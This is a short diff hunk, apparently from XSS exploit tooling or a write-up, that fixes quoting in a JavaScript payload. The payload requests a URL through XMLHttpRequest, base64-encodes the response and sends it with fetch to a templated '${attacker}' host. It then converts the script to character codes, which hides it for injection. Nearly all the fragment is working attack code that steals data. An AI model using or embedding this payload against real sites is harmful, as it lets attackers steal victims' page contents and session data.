@@ -25,7 +25,7 @@ xhr.onreadystatechange = function() {
         fetch("${attacker}" + "?" + encodeURI(btoa(xhr.responseText)))
     }
 }
-xhr.open('GET', ${url}, true);
+xhr.open('GET', "${url}", true);
 xhr.send(null);`
 const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',');
 ```
